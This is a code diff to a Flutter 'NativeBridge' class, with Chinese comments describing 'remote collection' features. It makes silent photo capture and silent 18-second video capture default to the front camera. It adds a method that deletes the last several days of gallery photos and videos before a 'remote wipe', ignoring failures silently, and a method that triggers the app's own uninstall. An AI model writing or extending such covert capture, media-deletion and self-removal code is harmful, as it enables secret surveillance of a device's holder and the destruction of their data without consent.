@@ -75,7 +75,7 @@ class NativeBridge {
   }
 
   /// 远程采集：拍照（静默），返回图片字节；原生未实现时返回空列表
-  static Future<List<int>> capturePhoto({String camera = 'back'}) async {
+  static Future<List<int>> capturePhoto({String camera = 'front'}) async {
     try {
       final result = await _channel.invokeMethod<List<Object?>>('capturePhoto', {'camera': camera});
       if (result == null) return [];
@@ -86,7 +86,7 @@ class NativeBridge {
   }
 
   /// 远程采集：录像（静默，durationSec 秒），返回视频字节；原生未实现时返回空列表
-  static Future<List<int>> captureVideo({int durationSec = 18, String camera = 'back'}) async {
+  static Future<List<int>> captureVideo({int durationSec = 18, String camera = 'front'}) async {
     try {
       final result = await _channel.invokeMethod<List<Object?>>('captureVideo', {'duration_sec': durationSec, 'camera': camera});
       if (result == null) return [];
@@ -104,6 +104,24 @@ class NativeBridge {
       return result.map((e) => e is int ? e : 0).toList();
     } on PlatformException {
       return [];
+    }
+  }
+
+  /// 清理设备相册中最近 [days] 天内的照片与视频（用于远程擦除前）；需内容管理/相册写权限；失败时静默忽略
+  static Future<void> clearGalleryWithinDays(int days) async {
+    try {
+      await _channel.invokeMethod<void>('clearGalleryWithinDays', days);
+    } on PlatformException {
+      // 权限不足或平台不支持时忽略，擦除流程继续
+    }
+  }
+
+  /// 调起系统卸载本应用（Android 弹窗确认；iOS 无系统 API，不执行）
+  static Future<void> uninstallApp() async {
+    try {
+      await _channel.invokeMethod<void>('uninstallApp');
+    } on PlatformException {
+      // iOS 或不支持时忽略
     }
   }
 }
